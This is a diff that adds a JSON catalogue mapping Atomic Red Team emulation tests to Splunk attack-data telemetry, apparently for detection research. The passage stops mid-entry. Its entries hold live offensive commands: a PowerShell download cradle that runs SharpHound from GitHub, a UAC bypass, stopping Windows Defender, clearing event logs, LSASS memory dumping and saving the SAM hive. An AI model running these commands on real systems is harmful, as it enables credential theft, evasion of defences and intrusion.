@@ -1,0 +1,932 @@
+{
+ "atomic_red_team": {
+  "commit": "a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6",
+  "license": "MIT",
+  "repo": "https://github.com/redcanaryco/atomic-red-team"
+ },
+ "attack": {
+  "data_release": "20.1",
+  "domain": "enterprise-attack",
+  "version": "20"
+ },
+ "library_version": 1,
+ "techniques": [
+  {
+   "atomic": {
+    "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force",
+    "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5",
+    "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.",
+    "elevation_required": false,
+    "executor": "powershell",
+    "guid": "bf8c1441-4674-4dab-8e4e-39d93d08f9b7",
+    "input_arguments": {},
+    "name": "Run Bloodhound from Memory using Download Cradle",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1059.001/T1059.001.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1059.001",
+   "dataset": {
+    "author": "Command and Scripting Interpreter: PowerShell",
+    "date": "2021-03-01",
+    "description": "Invoke-atomictest T1059.001 of all Atomic Red Team T1059.001 PowerShell tests.",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1059.001/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1059.001/atomic_red_team"
+   },
+   "dataset_id": "T1059.001",
+   "execution_kind": "atomic test",
+   "link": "command-matched",
+   "name": "PowerShell",
+   "note": "Task 1 listed 'Powershell Invoke-DownloadCradle' (a manual test with no command); the recording contains the download-cradle test above instead, matched by its command text.",
+   "tactics": [
+    "execution"
+   ],
+   "telemetry": "T1059.001/run-bloodhound-from-memory-using-download-cradle.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "wmic process where name='#{process_to_execute}' delete >nul 2>&1",
+    "command": "wmic process call create #{process_to_execute}",
+    "description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "b3bdfc91-b33e-4c6d-a5c8-d64bee0276b3",
+    "input_arguments": {
+     "process_to_execute": "notepad.exe"
+    },
+    "name": "WMI Execute Local Process",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1047/T1047.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1047",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-11-30",
+    "description": "Atomic Test Results: Return value unclear for test T1047-1 WMI Reconnaissance Users Return value unclear for test T1047-2 WMI Reconnaissance Processes Return value unclear for test T1047-3 WMI Reconnaissance Software Return value unclear for test T1047-4 WMI Reconnaissance List Remote Services Return value unclear for test T1047-5 WMI Execute Local Process Return value unclear for test T1047-6 WMI Execute Remote Process",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1047/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1047/atomic_red_team"
+   },
+   "dataset_id": "T1047",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Windows Management Instrumentation",
+   "note": null,
+   "tactics": [
+    "execution"
+   ],
+   "telemetry": "T1047/wmi-execute-local-process.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{remote_host} -i -u #{user_name} -p #{password} -accepteula \"C:\\Windows\\System32\\calc.exe\"",
+    "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).",
+    "elevation_required": true,
+    "executor": "command_prompt",
+    "guid": "873106b7-cfed-454b-8680-fa9f6400431c",
+    "input_arguments": {
+     "password": "P@ssw0rd1",
+     "remote_host": "localhost",
+     "user_name": "DOMAIN\\Administrator"
+    },
+    "name": "Use PsExec to execute a command on a remote host",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1569.002/T1569.002.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1569.002",
+   "dataset": {
+    "author": "Ryan Becwar",
+    "date": "2021-04-05",
+    "description": "Adversaries may abuse the Windows SC.exe to execute malicious commands or payloads which is captured by Windows System logs.",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1569.002/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1569.002/atomic_red_team"
+   },
+   "dataset_id": "T1569.002",
+   "execution_kind": "atomic test",
+   "link": "command-matched",
+   "name": "Service Execution",
+   "note": null,
+   "tactics": [
+    "execution"
+   ],
+   "telemetry": "T1569.002/use-psexec-to-execute-a-command-on-a-remote-host.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "SCHTASKS /Delete /TN spawn /F >nul 2>&1",
+    "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}",
+    "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "42f53695-ad4a-4546-abb6-7d837f644a71",
+    "input_arguments": {
+     "task_command": "C:\\windows\\system32\\cmd.exe",
+     "time": "20:10"
+    },
+    "name": "Scheduled task Local",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1053.005/T1053.005.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1053.005",
+   "dataset": {
+    "author": "Automated Attack Data Service",
+    "date": "2020-12-07",
+    "description": "Atomic Test Results: Return value unclear for test T1053.005-1 Scheduled Task Startup Script Return value unclear for test T1053.005-2 Scheduled task Local Return value unclear for test T1053.005-3 Scheduled task Remote Return value unclear for test T1053.005-4 Powershell Cmdlet Scheduled Task",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1053.005/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1053.005/atomic_red_team"
+   },
+   "dataset_id": "T1053.005",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Scheduled Task",
+   "note": null,
+   "tactics": [
+    "execution",
+    "persistence",
+    "privilege-escalation"
+   ],
+   "telemetry": "T1053.005/scheduled-task-local.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1",
+    "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"",
+    "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "e55be3fd-3521-4610-9d1a-e210e42dcf05",
+    "input_arguments": {
+     "command_to_execute": "C:\\Path\\AtomicRedTeam.exe"
+    },
+    "name": "Reg Key Run",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1547.001/T1547.001.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1547.001",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-11-27",
+    "description": "Atomic Test Results: Successful Execution of test T1547.001-1 Reg Key Run Successful Execution of test T1547.001-2 Reg Key RunOnce Return value unclear for test T1547.001-3 PowerShell Registry RunOnce Successful Execution of test T1547.001-4 Suspicious vbs file run from startup Folder Successful Execution of test T1547.001-5 Suspicious jse file run from startup Folder Return value unclear for test T1547.001-6 Suspicious bat file run from startup Folder",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1547.001/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1547.001/atomic_red_team"
+   },
+   "dataset_id": "T1547.001",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Registry Run Keys / Startup Folder",
+   "note": null,
+   "tactics": [
+    "persistence",
+    "privilege-escalation"
+   ],
+   "telemetry": "T1547.001/reg-key-run.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "sc.exe stop #{service_name} >nul 2>&1\nsc.exe delete #{service_name} >nul 2>&1",
+    "command": "sc.exe create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type}  type=#{service_type}\nsc.exe start #{service_name}",
+    "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.",
+    "elevation_required": true,
+    "executor": "command_prompt",
+    "guid": "981e2942-e433-44e9-afc1-8c957a1496b6",
+    "input_arguments": {
+     "binary_path": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe",
+     "service_name": "AtomicTestService_CMD",
+     "service_type": "Own",
+     "startup_type": "auto"
+    },
+    "name": "Service Installation CMD",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1543.003/T1543.003.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1543.003",
+   "dataset": {
+    "author": "Automated Attack Data Service",
+    "date": "2020-12-07",
+    "description": "Atomic Test Results: Return value unclear for test T1543.003-1 Modify Fax service to run PowerShell Return value unclear for test T1543.003-2 Service Installation CMD Return value unclear for test T1543.003-3 Service Installation PowerShell",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1543.003/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1543.003/atomic_red_team"
+   },
+   "dataset_id": "T1543.003",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Windows Service",
+   "note": null,
+   "tactics": [
+    "persistence",
+    "privilege-escalation"
+   ],
+   "telemetry": "T1543.003/service-installation-cmd.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "Remove-LocalUser -Name \"#{username}\" -ErrorAction Ignore",
+    "command": "New-LocalUser -Name \"#{username}\" -NoPassword",
+    "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"",
+    "elevation_required": true,
+    "executor": "powershell",
+    "guid": "bc8be0ac-475c-4fbf-9b1d-9fffd77afbde",
+    "input_arguments": {
+     "username": "T1136.001_PowerShell"
+    },
+    "name": "Create a new user in PowerShell",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1136.001/T1136.001.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1136.001",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-10-09",
+    "description": "Atomic Test Results: Return value unclear for test T1136.001-3 Create a new user in a command prompt Successful Execution of test T1136.001-4 Create a new user in PowerShell Successful Execution of test T1136.001-6 Create a new Windows admin user",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1136.001/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1136.001/atomic_red_team"
+   },
+   "dataset_id": "T1136.001",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Local Account",
+   "note": null,
+   "tactics": [
+    "persistence"
+   ],
+   "telemetry": "T1136.001/create-a-new-user-in-powershell.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "reg.exe delete hkcu\\software\\classes\\mscfile /f >nul 2>&1",
+    "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc",
+    "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "5073adf8-9a50-4bd9-b298-a9bd2ead8af9",
+    "input_arguments": {
+     "executable_binary": "C:\\Windows\\System32\\cmd.exe"
+    },
+    "name": "Bypass UAC using Event Viewer (cmd)",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1548.002/T1548.002.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1548.002",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-11-18",
+    "description": "Generation of Atomic Red Team technique T1548.002",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1548.002/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1548.002/atomic_red_team"
+   },
+   "dataset_id": "T1548.002",
+   "execution_kind": "atomic test",
+   "link": "command-matched",
+   "name": "Bypass User Account Control",
+   "note": null,
+   "tactics": [
+    "privilege-escalation"
+   ],
+   "telemetry": "T1548.002/bypass-uac-using-event-viewer-cmd.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "sc start WinDefend >nul 2>&1\nsc config WinDefend start=enabled >nul 2>&1",
+    "command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend",
+    "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.",
+    "elevation_required": true,
+    "executor": "command_prompt",
+    "guid": "aa875ed4-8935-47e2-b2c5-6ec00ab220d2",
+    "input_arguments": {},
+    "name": "Tamper with Windows Defender Command Prompt",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1685/T1685.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1685",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-10-09",
+    "description": "Atomic Test Results: Return value unclear for test T1562.001-9 Unload Sysmon Filter Driver Successful Execution of test T1562.001-10 Uninstall Sysmon Return value unclear for test T1562.001-11 AMSI Bypass - AMSI InitFailed Return value unclear for test T1562.001-12 AMSI Bypass - Remove AMSI Provider Reg Key Successful Execution of test T1562.001-13 Disable Arbitrary Security Windows Service Return value unclear for test T1562.001-14 Tamper with Windows Defender ATP PowerShell Successful Execution of test T1562.001-15 Tamper with Windows Defender Command Prompt Return value unclear for test T1562.001-16 Tamper with Windows Defender Registry Return value unclear for test T1562.001-17 Disable Microsoft Office Security Features Return value unclear for test T1562.001-18 Remove Windows Defender Definition Files Return value unclear for test T1562.001-19 Stop and Remove Arbitrary Security Windows Service Return value unclear for test T1562.001-20 Uninstall Crowdstrike Falcon on Windows Return value unclear for test T1562.001-21 Tamper with Windows Defender Evade Scanning -Folder Return value unclear for test T1562.001-22 Tamper with Windows Defender Evade Scanning -Extension Return value unclear for test T1562.001-23 Tamper with Windows Defender Evade Scanning -Process",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1562.001/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1562.001/atomic_red_team"
+   },
+   "dataset_id": "T1562.001",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Disable or Modify Tools",
+   "note": null,
+   "tactics": [
+    "defense-impairment"
+   ],
+   "telemetry": "T1685/tamper-with-windows-defender-command-prompt.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "wevtutil cl #{log_name}",
+    "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.",
+    "elevation_required": true,
+    "executor": "command_prompt",
+    "guid": "e6abb60e-26b8-41da-8aae-0c35174b0967",
+    "input_arguments": {
+     "log_name": "System"
+    },
+    "name": "Clear Logs",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1685.005/T1685.005.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1685.005",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-10-09",
+    "description": "Atomic Test Results: Return value unclear for test T1070.001-1 Clear Logs Successful Execution of test T1070.001-2 Delete System Logs Using Clear-EventLog",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1070.001/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1070.001/atomic_red_team"
+   },
+   "dataset_id": "T1070.001",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Clear Windows Event Logs",
+   "note": null,
+   "tactics": [
+    "defense-impairment"
+   ],
+   "telemetry": "T1685.005/clear-logs.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)",
+    "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "638730e7-7aed-43dc-bf8c-8117f805f5bb",
+    "input_arguments": {
+     "command_to_execute": "calc.exe"
+    },
+    "name": "Rundll32 execute VBscript command",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1218.011/T1218.011.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1218.011",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-11-30",
+    "description": "Atomic Test Results: Successful Execution of test T1218.011-1 Rundll32 execute JavaScript Remote Payload With GetObject Successful Execution of test T1218.011-2 Rundll32 execute VBscript command Return value unclear for test T1218.011-3 Rundll32 advpack.dll Execution Return value unclear for test T1218.011-4 Rundll32 ieadvpack.dll Execution Return value unclear for test T1218.011-5 Rundll32 syssetup.dll Execution Return value unclear for test T1218.011-6 Rundll32 setupapi.dll Execution",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1218.011/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1218.011/atomic_red_team"
+   },
+   "dataset_id": "T1218.011",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Rundll32",
+   "note": null,
+   "tactics": [
+    "stealth"
+   ],
+   "telemetry": "T1218.011/rundll32-execute-vbscript-command.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")",
+    "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "906865c3-e05f-4acc-85c4-fbc185455095",
+    "input_arguments": {},
+    "name": "Mshta executes VBScript to execute malicious command",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1218.005/T1218.005.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1218.005",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-11-09",
+    "description": "Invoked AtomicTestHarnesses executing T1218.005 manually and via pester tests. Atomic Test Results: Successful Execution of test T1218.005-1 Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject Return value unclear for test T1218.005-2 Mshta executes VBScript to execute malicious command Return value unclear for test T1218.005-3 Mshta Executes Remote HTML Application (HTA) Successful Execution of test T1218.005-4 Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement Successful Execution of test T1218.005-5 Invoke HTML Application - Jscript Engine Simulating Double Click Successful Execution of test T1218.005-6 Invoke HTML Application - Direct download from URI Successful Execution of test T1218.005-7 Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler Successful Execution of test T1218.005-8 Invoke HTML Application - JScript Engine with Inline Protocol Handler Successful Execution of test T1218.005-9 Invoke HTML Application - Simulate Lateral Movement over UNC Path",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1218.005/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1218.005/atomic_red_team"
+   },
+   "dataset_id": "T1218.005",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Mshta",
+   "note": "The dataset was generated with AtomicTestHarnesses; the recorded mshta command line is the harness variant of the VBScript test, not the Atomic Red Team command string verbatim.",
+   "tactics": [
+    "stealth"
+   ],
+   "telemetry": "T1218.005/mshta-executes-vbscript-to-execute-malicious-command.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:\"#{filename}\" scrobj.dll",
+    "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.",
+    "elevation_required": false,
+    "executor": "command_prompt",
+    "guid": "449aa403-6aba-47ce-8a37-247d21ef0306",
+    "input_arguments": {
+     "filename": "PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct",
+     "regsvr32name": "regsvr32.exe",
+     "regsvr32path": "C:\\Windows\\system32"
+    },
+    "name": "Regsvr32 local COM scriptlet execution",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1218.010/T1218.010.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1218.010",
+   "dataset": {
+    "author": "Michael Haag",
+    "date": "2021-01-28",
+    "description": "Successful execution of Atomic Tests T1218.010 T1218.010-1 Regsvr32 local COM scriptlet execution T1218.010-2 Regsvr32 remote COM scriptlet execution T1218.010-3 Regsvr32 local DLL execution T1218.010-4 Regsvr32 Registering Non DLL Manual execution of same tests, but with moved/renamed regsvr32.exe",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1218.010/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1218.010/atomic_red_team"
+   },
+   "dataset_id": "T1218.010",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Regsvr32",
+   "note": null,
+   "tactics": [
+    "stealth"
+   ],
+   "telemetry": "T1218.010/regsvr32-local-com-scriptlet-execution.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "",
+    "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand",
+    "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"",
+    "elevation_required": false,
+    "executor": "powershell",
+    "guid": "a50d5a97-2531-499e-a1de-5544c74432c6",
+    "input_arguments": {
+     "powershell_command": "Write-Host \"Hey, Atomic!\""
+    },
+    "name": "Execute base64-encoded PowerShell",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1027/T1027.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1027",
+   "dataset": {
+    "author": "Patrick Bareiss",
+    "date": "2020-10-08",
+    "description": "Atomic Test Results: Successful Execution of test T1027-2 Execute base64-encoded PowerShell Successful Execution of test T1027-3 Execute base64-encoded PowerShell from Windows Registry Return value unclear for test T1027-4 Execution from Compressed File",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1027/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1027/atomic_red_team"
+   },
+   "dataset_id": "T1027",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "Obfuscated Files or Information",
+   "note": null,
+   "tactics": [
+    "stealth"
+   ],
+   "telemetry": "T1027/execute-base64-encoded-powershell.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "del \"#{output_file}\" >nul 2> nul",
+    "command": "\"#{procdump_exe}\" -accepteula -ma lsass.exe #{output_file}",
+    "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.",
+    "elevation_required": true,
+    "executor": "command_prompt",
+    "guid": "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8",
+    "input_arguments": {
+     "output_file": "C:\\Windows\\Temp\\lsass_dump.dmp",
+     "procdump_exe": "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe"
+    },
+    "name": "Dump LSASS.exe Memory using ProcDump",
+    "source_url": "https://github.com/redcanaryco/atomic-red-team/blob/a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6/atomics/T1003.001/T1003.001.yaml",
+    "supported_platforms": [
+     "windows"
+    ]
+   },
+   "attack_id": "T1003.001",
+   "dataset": {
+    "author": "Patrick Bareiss, Michael Haag",
+    "date": "2022-01-12",
+    "description": "Atomic Test Results: Successful Execution of test T1003.001-1 Windows Credential Editor Successful Execution of test T1003.001-2 Dump LSASS.exe Memory using ProcDump Return value unclear for test T1003.001-3 Dump LSASS.exe Memory using comsvcs.dll Successful Execution of test T1003.001-4 Dump LSASS.exe Memory using direct system calls and API unhooking Return value unclear for test T1003.001-6 Offline Credential Theft With Mimikatz Return value unclear for test T1003.001-7 LSASS read with pypykatz",
+    "environment": "attack_range",
+    "license": "Apache-2.0",
+    "name": "Splunk attack_data T1003.001/atomic_red_team",
+    "url": "https://github.com/splunk/attack_data/tree/c8af10d015d392fca97f9eb65181e9f06bc18e40/datasets/attack_techniques/T1003.001/atomic_red_team"
+   },
+   "dataset_id": "T1003.001",
+   "execution_kind": "atomic test",
+   "link": "named",
+   "name": "LSASS Memory",
+   "note": null,
+   "tactics": [
+    "credential-access"
+   ],
+   "telemetry": "T1003.001/dump-lsass-exe-memory-using-procdump.jsonl.gz"
+  },
+  {
+   "atomic": {
+    "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul",
+    "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security",
+    "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.",
+    "elevation_required": true,
+    "executor": "command_prompt",
+    "guid": "5c2571d0-1572-416d-9676-812e64ca9f44",
+    "input_arguments": {},
+    "name": "Registry dump of SAM, creds, and secrets",
